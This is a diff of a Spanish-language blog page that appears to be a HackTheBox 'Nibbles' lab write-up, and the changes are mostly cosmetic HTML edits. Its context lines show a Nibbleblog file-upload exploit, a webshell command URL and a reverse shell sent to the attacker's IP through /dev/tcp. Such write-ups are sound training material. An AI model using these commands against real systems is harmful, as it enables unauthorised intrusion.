@@ -106,6 +106,7 @@
 
   </head>
 
+<script src="/assets/js/codeblock.js"></script>
   <body class="layout--single wide">
 
     <!--[if lt IE 9]>
@@ -208,7 +209,7 @@
     
     
       <p class="author__bio" itemprop="description">
-        Ethical hacker | eJPT
+        Ethical hacker | eJPT | eCPPT
       </p>
     
   </div>
@@ -334,7 +335,7 @@
           
           
         </p>
-        <p align="center">
+        <p style="text-align: center;">
 <img src="/assets/images/nibbles/02-tarjeta.png">
 </p>
 
@@ -408,7 +409,7 @@ http://10.10.10.75 <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESER
 &lt;<span class="o">!</span><span class="nt">--</span> /nibbleblog/ directory. Nothing interesting here! <span class="nt">--</span><span class="o">&gt;</span>
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/03-page.png">
 </p>
 
@@ -425,13 +426,13 @@ http://10.10.10.75 <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESER
 
 <p>Al revisar los directorios, podemos identificar un potencial usuario <code class="language-plaintext highlighter-rouge">admin</code>, el cual puede ser de utilidad en el momento de acceder con credenciales a un portal.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/04-page2.png">
 </p>
 
 <p>También logramos detectar la versión de <code class="language-plaintext highlighter-rouge">nibbleblog</code> almacenado en un screenshot en lo recursos de la máquina.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/05-page3.png">
 </p>
 
@@ -447,7 +448,7 @@ Nibbleblog 4.0.3 - Arbitrary File Upload <span class="o">(</span>Me | php/remote
 
 <p>Luego de entender un poco más el script, su función se basa en el plugin <code class="language-plaintext highlighter-rouge">my_image</code> que permite la subida de archivos, sin embargo, requerimos de un acceso al portal, por lo que accedemos a la ruta <code class="language-plaintext highlighter-rouge">http://10.10.10.75/nibbleblog/admin.php</code>.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/06-page4.png">
 </p>
 
@@ -457,13 +458,13 @@ Nibbleblog 4.0.3 - Arbitrary File Upload <span class="o">(</span>Me | php/remote
 
 <p><em>NOTA: El usuario <code class="language-plaintext highlighter-rouge">admin</code> lo obtuvimos de la enumeración web</em></p>
 
-<p align="center">  
+<p style="text-align: center;">  
 <img src="/assets/images/nibbles/07-page5.png">      
 </p>
 
 <p>Ahora que tenemos acceso a las opciones del servidor, vamos a acceder a la carpeta <code class="language-plaintext highlighter-rouge">plugins</code> y configuramos el plugin <code class="language-plaintext highlighter-rouge">My image</code>.</p>
 
-<p align="center">  
+<p style="text-align: center;">  
 <img src="/assets/images/nibbles/08-page6.png">      
 </p>
 
@@ -486,7 +487,7 @@ Nibbleblog 4.0.3 - Arbitrary File Upload <span class="o">(</span>Me | php/remote
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nb">whoami</span>
 </code></pre></div></div>
 
-<p align="center">  
+<p style="text-align: center;">  
 <img src="/assets/images/nibbles/09-page7.png">        
 </p>
 
@@ -500,7 +501,7 @@ Nibbleblog 4.0.3 - Arbitrary File Upload <span class="o">(</span>Me | php/remote
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span>bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;%26 /dev/tcp/10.10.14.6/4564 0&gt;%261"</span>
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/10-page8.png"> 
 </p>
 
@@ -532,7 +533,7 @@ Nibbleblog 4.0.3 - Arbitrary File Upload <span class="o">(</span>Me | php/remote
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/11-page9.png"> 
 </p>
 
@@ -591,7 +592,7 @@ find / <span class="nt">-name</span> root.txt 2&gt;/dev/null | xargs <span class
 
 <p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">nibbles</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/nibbles/12-finish.png">
 </p>
 
@@ -704,6 +705,7 @@ find / <span class="nt">-name</span> root.txt 2&gt;/dev/null | xargs <span class
     
   <script src="/assets/js/main.min.js"></script>
   <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" integrity="sha384-rOA1PnstxnOBLzCLMcre8ybwbTmemjzdNlILg8O7z1lUkLXozs4DHonlDtnE7fpc" crossorigin="anonymous"></script>
+  <script src="/assets/js/codeblock.js"></script>
   
 
 
